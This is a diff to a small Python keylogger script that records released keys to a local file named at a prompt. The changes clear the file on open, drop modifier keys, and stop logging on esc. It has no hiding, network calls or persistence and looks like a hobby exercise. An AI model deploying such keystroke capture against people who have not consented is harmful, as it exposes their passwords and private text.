@@ -3,9 +3,13 @@ import keyboard
 class KeyLogger():
     def __init__(self, filename):
         self.log_file = open(filename, "w+")
+        self.log_file.seek(0)
+        self.log_file.truncate()
     
     def ReadKey(self, key):
         print_key = key.name
+        if print_key in ["ctrl", "right ctrl", "shift", "right shift", "esc"]:
+            print_key = ""
         match print_key:
             case "space": 
                 print_key = " "
@@ -23,12 +27,11 @@ class KeyLogger():
 
     def StartLog(self):
         keyboard.on_release(callback = self.ReadKey)
-        keyboard.wait()
+        keyboard.wait("esc")
 
 def main():
     key_log = KeyLogger(input("enter name of output text: "))
-    while True:
-        key_log.StartLog()
+    key_log.StartLog()
 
 
 if __name__ == "__main__":
